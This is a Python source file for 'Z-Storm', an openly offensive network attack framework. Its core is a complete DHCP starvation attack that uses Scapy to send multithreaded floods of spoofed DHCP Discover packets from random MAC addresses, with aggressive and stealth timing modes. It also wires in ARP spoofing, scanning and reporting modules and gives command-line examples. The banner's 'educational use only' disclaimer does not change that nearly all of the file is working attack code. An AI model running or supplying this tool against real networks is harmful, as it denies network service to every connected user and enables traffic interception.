#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Z-Storm - Network Attack Framework
Developed by: Youssef Zedan

Features:
- DHCP Starvation Attack
- ARP Spoofing
- Auto Lab Automation
- Smart Scanner
- Advanced Reporting
"""

import os
import sys
import time
import json
import yaml
import random
import logging
import threading
import argparse
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# --- التعديل الجديد: إضافة مكتبة netifaces للكشف التلقائي ---
try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    NETIFACES_AVAILABLE = False
    print("[!] netifaces not installed. Run: pip install netifaces")

from modules.smart_scanner import SmartScanner
from modules.advanced_report import AdvancedReport
from modules.arp_spoof import ARPSpoofer
from modules.auto_lab import AutoLab

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP,
        sendp, get_if_hwaddr, conf,
        ARP, srp
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not installed. Run: pip install scapy")


class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'


class ZStorm:
    """
    Z-Storm - Main attack framework
    Integrates all modules into one tool
    """
    
    def __init__(self, interface: str = "auto", config_file: str = "config.yaml"):
        """Initialize Z-Storm with all modules"""
        self.interface = interface or self._auto_detect_interface()
        self.config = self._load_config(config_file)
        
        # Initialize modules
        self.scanner = None
        self.arp_spoofer = None
        self.lab = None
        
        # Attack settings
        self.running = False
        self.paused = False
        self.attack_mode = self.config.get('attack', {}).get('mode', 'intelligent')
        self.thread_count = self.config.get('attack', {}).get('threads', 5)
        self.max_macs = self.config.get('attack', {}).get('max_macs', 10000)
        
        self.stats = {
            'packets_sent': 0,
            'macs_generated': 0,
            'threads_active': 0,
            'start_time': None,
            'end_time': None,
            'total_attack_time': 0,
            'packets_per_second': 0,
            'success': False
        }
        
        self.generated_macs = set()
        self.threads = []
        self.broadcast_mac = "ff:ff:ff:ff:ff:ff"
        self.broadcast_ip = "255.255.255.255"
        
        try:
            self.attacker_mac = get_if_hwaddr(self.interface)
        except:
            self.attacker_mac = "00:00:00:00:00:00"
        
        self._setup_logging()
        self._print_banner()
        self._log_info(f"Interface: {self.interface}")
        self._log_info(f"Attacker MAC: {self.attacker_mac}")
        self._log_info(f"Mode: {self.attack_mode}")
        self._log_info(f"Threads: {self.thread_count}")
    
    # --- تعديل رقم 1: دالة الكشف التلقائي المتقدمة ---
    def _auto_detect_interface(self) -> str:
        """Auto-detect active network interface with netifaces or fallback to subprocess"""
        # استخدام netifaces أولاً (الأدق والأسرع)
        if NETIFACES_AVAILABLE:
            try:
                gateways = netifaces.gateways()
                if netifaces.AF_INET in gateways:
                    default_gw = gateways[netifaces.AF_INET][0]
                    interface = default_gw[1]
                    if interface != 'lo':
                        return interface
            except:
                pass
        
        # Fallback: الطريقة القديمة باستخدام subprocess
        try:
            if sys.platform == "linux":
                result = subprocess.run(
                    ["ip", "route", "show", "default"],
                    capture_output=True, text=True
                )
                for line in result.stdout.split('\n'):
                    if 'dev' in line:
                        return line.split('dev')[1].split()[0]
            elif sys.platform == "darwin":
                result = subprocess.run(
                    ["route", "-n", "get", "default"],
                    capture_output=True, text=True
                )
                for line in result.stdout.split('\n'):
                    if 'interface:' in line:
                        return line.split(':')[1].strip()
        except:
            pass
        return "eth0"
    
    def _load_config(self, config_file: str) -> dict:
        """Load configuration from YAML file"""
        default_config = {
            'attack': {
                'mode': 'intelligent',
                'threads': 5,
                'max_macs': 10000,
                'delay_min': 0.001,
                'delay_max': 0.01,
                'auto_detect_dhcp': True,
                'timeout': 300
            },
            'smart_scanner': {
                'enabled': True,
                'timeout': 5,
                'classify_devices': True
            },
            'reporting': {
                'enabled': True,
                'formats': ['json', 'html', 'markdown'],
                'include_network_info': True,
                'include_recommendations': True,
                'save_path': 'reports/'
            },
            'arp_spoofing': {
                'enabled': False,
                'target_ip': None,
                'gateway_ip': None,
                'interval': 2.0
            },
            'lab_automation': {
                'enabled': False,
                'lab_type': 'eve-ng',
                'auto_setup': True,
                'auto_cleanup': True
            },
            'logging': {
                'level': 'INFO',
                'file': 'dhcp_attack.log',
                'max_size_mb': 10
            },
            'network': {
                'interface': 'auto',
                'timeout': 2,
                'retries': 3
            },
            'stealth': {
                'randomize_delay': True,
                'spoof_mac': False
            }
        }
        
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8') as f:
                    config = yaml.safe_load(f)
                    for key in default_config:
                        if key not in config:
                            config[key] = default_config[key]
                    return config
            else:
                with open(config_file, 'w', encoding='utf-8') as f:
                    yaml.dump(default_config, f, default_flow_style=False)
                return default_config
        except Exception as e:
            self._log_error(f"Error loading config: {e}")
            return default_config
    
    def _setup_logging(self):
        """Setup logging system"""
        log_file = self.config.get('logging', {}).get('file', 'dhcp_attack.log')
        log_level = self.config.get('logging', {}).get('level', 'INFO')
        
        logging.basicConfig(
            level=getattr(logging, log_level),
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file, encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger('ZStorm')
    
    def _print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.BOLD}{Colors.CYAN}
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║     ██████  ██░ ██  ██████  ██████   █████  ████████        ║
║     ██▓ ██ ▓██░ ██▒▒██▓  ██▒▒██▓  ██▒▓██   ▒ ▓██▒           ║
║     ▓██  ▓█ ▒██▀▀██░▒██▒  ██▓▒██████  ▒█████  ▒██░           ║
║     ██████  ░▓█ ░██ ░██▓  ██░▒▓█▒  ░ ░▓█▒  ░ ▒██▓           ║
║     ██░ ██  ░▓█▒░██▓░▒██████▓▒░▒████░ ░▒████  ░██▓           ║
║     ▓█████  ░ ░░▒░ ░ ▒ ▒▓▒ ▒ ░░░ ▒░ ░  ░░░▒░  ░▒▓░           ║
║     ██░ ██  ░ ▒░ ░ ░ ░ ░▒  ░ ░ ░ ░  ░ ░ ░░ ░  ░▒ ░           ║
║     ▓█████  ░  ░   ░ ░  ░  ░   ░    ░  ░   ░  ░             ║
║     ██░ ██  ░        ░      ░   ░  ░     ░     ░             ║
║                                                               ║
║          Z-Storm v1.0.0 - Network Attack Framework          ║
║          Developed by Youssef Zedan                         ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}⚠️  For Educational Use Only - Authorized Lab Environments{Colors.END}
{Colors.RED}🚫 Unauthorized Use is Prohibited and Illegal{Colors.END}
        """
        print(banner)
    
    def _log_info(self, message: str):
        self.logger.info(f"ℹ️ {message}")
    
    def _log_warning(self, message: str):
        self.logger.warning(f"⚠️ {message}")
    
    def _log_error(self, message: str):
        self.logger.error(f"❌ {message}")
    
    def _log_success(self, message: str):
        self.logger.info(f"✅ {message}")
    
    def scan_network(self) -> Dict:
        """Run smart scanner"""
        print("\n" + "="*50)
        print("🔍 Smart Scanner")
        print("="*50)
        
        self.scanner = SmartScanner(
            interface=self.interface,
            timeout=self.config.get('smart_scanner', {}).get('timeout', 5)
        )
        network_info = self.scanner.scan_network()
        self.scanner.print_network_info()
        
        targets = self.scanner.get_attack_targets()
        print("\n🎯 Recommended targets:")
        print(f"   DHCP Servers: {targets['dhcp_servers']}")
        print(f"   Recommended attack: {targets['recommended_attack']}")
        
        return network_info
    
    def generate_intelligent_mac(self) -> str:
        """Generate random MAC address with real OUIs"""
        common_ouis = [
            [0x00, 0x0c, 0x29], [0x00, 0x50, 0x56], [0x00, 0x05, 0x69],
            [0x00, 0x1a, 0x11], [0x00, 0x1c, 0x42], [0x00, 0x1d, 0x71],
            [0x00, 0x1e, 0x68], [0x00, 0x15, 0x5d], [0x00, 0x03, 0x47],
            [0x00, 0x16, 0x3e], [0x08, 0x00, 0x27], [0x52, 0x54, 0x00]
        ]
        
        oui = random.choice(common_ouis)
        last_bytes = [
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff)
        ]
        
        mac = oui + last_bytes
        mac[0] |= 0x02
        mac[0] &= 0xfe
        
        mac_str = ":".join([f"{b:02x}" for b in mac])
        
        attempts = 0
        while mac_str in self.generated_macs and attempts < 100:
            mac[-1] = random.randint(0x00, 0xff)
            mac_str = ":".join([f"{b:02x}" for b in mac])
            attempts += 1
        
        self.generated_macs.add(mac_str)
        self.stats['macs_generated'] += 1
        
        return mac_str
    
    def create_dhcp_discover(self, client_mac: str, transaction_id: Optional[int] = None) -> Ether:
        """Create DHCP Discover packet"""
        if transaction_id is None:
            transaction_id = random.randint(0, 0xffffffff)
        
        client_mac_bytes = bytes.fromhex(client_mac.replace(":", ""))
        
        options = [
            ("message-type", "discover"),
            ("client_id", b"\x01" + client_mac_bytes),
            ("parameter_request_list", b"\x01\x02\x03\x04\x05\x06\x07\x08\x0f\x10\x12\x1a\x1b\x1c\x1f\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x30\x33\x36\x37\x39\x3a\x3b\x3c\x3d\x3e"),
            ("vendor_class_id", random.choice([b"MSFT 5.0", b"MSFT 6.0", b"Linux 2.4", b"Apple", b"Android"])),
            ("hostname", f"host-{random.randint(1000, 9999)}".encode()),
            ("max_size", 1500),
        ]
        
        if self.attack_mode == "intelligent":
            options.append(("lease_time", random.randint(86400, 604800)))
        
        options.append("end")
        
        ether = Ether(dst=self.broadcast_mac, src=client_mac, type=0x0800)
        ip = IP(src="0.0.0.0", dst=self.broadcast_ip)
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(
            op=1, htype=1, hlen=6, hops=0,
            xid=transaction_id, secs=random.randint(0, 60),
            flags=0x8000, ciaddr="0.0.0.0", yiaddr="0.0.0.0",
            siaddr="0.0.0.0", giaddr="0.0.0.0", chaddr=client_mac_bytes
        )
        dhcp = DHCP(options=options)
        
        return ether / ip / udp / bootp / dhcp
    
    def send_packet_thread(self, thread_id: int):
        """Packet sending thread"""
        local_count = 0
        
        while self.running:
            if self.paused:
                time.sleep(0.1)
                continue
            
            try:
                client_mac = self.generate_intelligent_mac()
                packet = self.create_dhcp_discover(client_mac)
                
                sendp(packet, iface=self.interface, verbose=False)
                self.stats['packets_sent'] += 1
                local_count += 1
                
                if local_count % 100 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    rate = local_count / elapsed if elapsed > 0 else 0
                    self._log_info(
                        f"Thread {thread_id}: {local_count} packets - "
                        f"Rate: {rate:.1f}/s - "
                        f"Total: {self.stats['packets_sent']}"
                    )
                
                if self.attack_mode == "aggressive":
                    delay = random.uniform(0.0001, 0.001)
                elif self.attack_mode == "stealth":
                    delay = random.uniform(0.01, 0.1)
                else:
                    delay = random.uniform(0.001, 0.01)
                
                time.sleep(delay)
                
                if self.stats['macs_generated'] >= self.max_macs:
                    break
                
            except Exception as e:
                self._log_error(f"Error in thread {thread_id}: {e}")
                time.sleep(1)
        
        self.stats['threads_active'] -= 1
    
    def start_attack(self, network_info: Dict = None):
        """Start DHCP Starvation Attack"""
        print("\n" + "="*50)
        print("⚡ Starting Z-Storm Attack")
        print("="*50)
        
        if network_info is None and self.config.get('smart_scanner', {}).get('enabled', True):
            network_info = self.scan_network()
        
        self.running = True
        self.stats['start_time'] = time.time()
        self.stats['threads_active'] = self.thread_count
        
        self._log_info(f"Attack mode: {self.attack_mode}")
        self._log_info(f"Threads: {self.thread_count}")
        self._log_info("Press Ctrl+C to stop")
        
        for i in range(self.thread_count):
            thread = threading.Thread(
                target=self.send_packet_thread,
                args=(i,),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            time.sleep(0.05)
        
        try:
            while self.running:
                time.sleep(1)
                elapsed = time.time() - self.stats['start_time']
                rate = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
                
                print(f"\r{Colors.CYAN}📊 Packets: {self.stats['packets_sent']} | "
                      f"MACs: {self.stats['macs_generated']} | "
                      f"Rate: {rate:.1f}/s | "
                      f"Time: {elapsed:.1f}s{Colors.END}", end="")
                
        except KeyboardInterrupt:
            print("\n")
            self._log_info("Attack stopped by user")
            self.stop_attack()
        
        self._generate_report(network_info)
    
    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        self.stats['end_time'] = time.time()
        self.stats['total_attack_time'] = self.stats['end_time'] - self.stats['start_time']
        self.stats['packets_per_second'] = self.stats['packets_sent'] / self.stats['total_attack_time'] if self.stats['total_attack_time'] > 0 else 0
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self._print_stats()
    
    def _print_stats(self):
        """Print attack statistics"""
        print("\n" + "="*50)
        print("📊 Attack Statistics")
        print("="*50)
        print(f"Packets sent: {self.stats['packets_sent']}")
        print(f"MACs generated: {self.stats['macs_generated']}")
        print(f"Duration: {self.stats['total_attack_time']:.2f}s")
        print(f"Rate: {self.stats['packets_per_second']:.1f} packets/s")
        print("="*50)
    
    def _generate_report(self, network_info: Dict = None):
        """Generate advanced report"""
        if not self.config.get('reporting', {}).get('enabled', True):
            return
        
        print("\n" + "="*50)
        print("📄 Generating Advanced Report")
        print("="*50)
        
        self.stats['success'] = self.stats['packets_sent'] > 1000
        
        attack_data = {
            'success': self.stats['success'],
            'attack': {
                'mode': self.attack_mode,
                'threads': self.thread_count,
                'interface': self.interface
            },
            'stats': self.stats
        }
        
        formats = self.config.get('reporting', {}).get('formats', ['json', 'html', 'markdown'])
        
        report = AdvancedReport(attack_data, network_info)
        files = report.generate(formats)
        
        print("\n📁 Report files:")
        for fmt, filepath in files.items():
            print(f"   • {fmt}: {filepath}")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="🌩️ Z-Storm - Network Attack Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  zstorm -i eth0
  zstorm -i eth0 --scan
  zstorm -i eth0 -m aggressive -t 10
  zstorm --report
        """
    )
    
    parser.add_argument("-i", "--interface", help="Network interface (auto-detected if not set)")
    parser.add_argument("-m", "--mode", choices=['basic', 'aggressive', 'stealth', 'intelligent'],
                       default='intelligent', help="Attack mode")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--scan", action="store_true", help="Run network scan only")
    parser.add_argument("--report", action="store_true", help="Generate report only")
    parser.add_argument("-c", "--config", default="config.yaml", help="Config file")
    
    # --- تعديل رقم 2: إضافة خيارات الإعدادات المتقدمة ---
    parser.add_argument("--target", help="Target IP (for ARP spoofing)")
    parser.add_argument("--gateway", help="Gateway IP (auto-detected if not set)")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] Root privileges recommended")
    
    if not SCAPY_AVAILABLE:
        print("[!] Scapy not installed. Run: pip install scapy")
        sys.exit(1)
    
    if not NETIFACES_AVAILABLE:
        print("[!] netifaces not installed. Run: pip install netifaces")
        print("[*] Falling back to subprocess for interface detection.")
    
    storm = ZStorm(
        interface=args.interface or "auto",
        config_file=args.config
    )
    
    # --- تعديل رقم 3: تحديث الإعدادات بناءً على خيارات المستخدم ---
    if args.target:
        storm.config['arp_spoofing']['target_ip'] = args.target
    if args.gateway:
        storm.config['arp_spoofing']['gateway_ip'] = args.gateway
    
    if args.scan:
        storm.scan_network()
        sys.exit(0)
    
    if args.report:
        storm._generate_report()
        sys.exit(0)
    
    storm.attack_mode = args.mode
    storm.thread_count = args.threads
    
    try:
        storm.start_attack()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        storm.stop_attack()


if __name__ == "__main__":
    main()
